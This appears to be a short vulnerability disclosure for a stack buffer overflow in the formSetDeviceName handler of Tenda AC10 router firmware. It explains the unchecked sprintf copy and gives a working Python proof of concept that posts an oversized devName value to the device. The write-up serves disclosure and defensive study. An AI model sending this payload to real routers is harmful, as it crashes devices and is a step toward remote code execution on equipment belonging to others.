stackflow\_formSetDeviceName
----------------------------

### Overview

*   Equipment website：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   Firmware download website：[AC10V1.0升级软件](https://www.tenda.com.cn/material/show/102734)

### Affected version

V1.0 V15.03.06.23

### Vulnerability details

Tenda AC10 V1.0 V15.03.06.23 The devName argument in the formSetDeviceName function causes a stack overflow and passes it to the function "set\_device\_name" without any length checking. Once the ROP chain is built, malicious code can be executed.
![image](https://github.com/user-attachments/assets/5d1c6efd-62dc-4064-8011-0dffee096432)

After getting the mac and devName parameters, type set\_device\_name, check only if the parameter "dev\_name" exists, and use sprintf to pass it to the "mib\_name" array, which will overflow the stack if the length exceeds it

![image](https://github.com/user-attachments/assets/8f33ad4a-94f9-47f2-b35e-f1b6d9420636)


### poc

```text-plain
import requests
ip = '192.168.159.100'
url = f'http://{ip}/goform/SetOnlineDevName'
payload = {
   "mac": '9c:fc:e8:da:9c:5b',
   "devName": 'Raining'*0x500
}
res = requests.post(url=url, data=payload)
print(res.content)
```

![image](https://github.com/user-attachments/assets/df91aea1-335e-4519-8853-273238cf1623)

